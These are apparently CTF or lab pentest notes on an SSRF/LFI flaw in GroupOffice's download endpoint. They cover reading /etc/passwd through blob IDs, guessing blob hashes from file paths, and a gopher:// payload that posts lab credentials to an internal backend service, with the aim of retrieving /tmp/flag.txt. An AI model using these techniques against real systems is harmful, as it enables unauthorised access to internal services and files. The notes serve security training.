## SSRF & File Enumeration Summary – GroupOffice Pentest

### 🔍 Objective
Exploit SSRF vulnerability in the "Preview Link" or file download mechanism to access internal services and retrieve sensitive files like `/tmp/flag.txt`.

---

### ✅ Successful Actions

- Discovered an endpoint:
  ```
  GET /api/download.php?blob=<hash>&inline=1
  ```
- Used blob ID:
  ```
  9d314cd09bc8f735df8ee4533d2a5d8a659428f1
  ```
  to download `/etc/passwd`, confirming SSRF/LFI access to backend file system.

- The server returned a full `/etc/passwd` listing:
  - Apache 2.4.51 on Debian
  - Response code: `HTTP/1.1 200 OK`
  - Content-Disposition: `inline`
  - Content-Type: `application/octet-stream`

---

### 📁 Goal
Access `/tmp/flag.txt` via same blob mechanism.

---

### 🧪 Exploitation Techniques

- **Blob guessing** via hashing:
  ```bash
  echo -n "/tmp/flag.txt" | sha1sum
  # OR
  echo -n "/tmp/flag.txt" | sha256sum
  ```
  → Use result in `blob=` parameter:
  ```
  /api/download.php?blob=<hash>&inline=1
  ```

- **Alternative access** via SSRF:
  - Attempted Gopher SSRF POST to `/login`
  - Final payload (double URL-encoded) pointed to internal service on `backend:80`
  - Correct format:
    ```
    gopher://backend:80/_POST /login HTTP/1.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 38

    username=white.rabbit&password=dontbelate
    ```
  - Common issues encountered:
    - 403 Forbidden: likely due to incorrect Host header or permissions
    - 405 Method Not Allowed: incorrect method used (e.g., GET instead of POST)
    - “An exception occurred”: indicates malformed Gopher encoding or target misconfiguration

---

### 🧠 Notes

- Server uses ETag headers for caching; blob may map to file path or content hash.
- No blob listing endpoint discovered, so guessing or LFI/SSRF required.
- SSRF used with `utility=curl` or Gopher to enumerate services.
- Headers returned confirm Apache 2.4 on Debian, may help with guessing paths.

---

### 📌 TODO

- Confirm correct blob hash for `/tmp/flag.txt`
- Explore additional SSRF vectors for direct file access (e.g., file:// or Gopher)
- Investigate internal hostnames (e.g., `backend`, `groupoffice`, `localhost`)
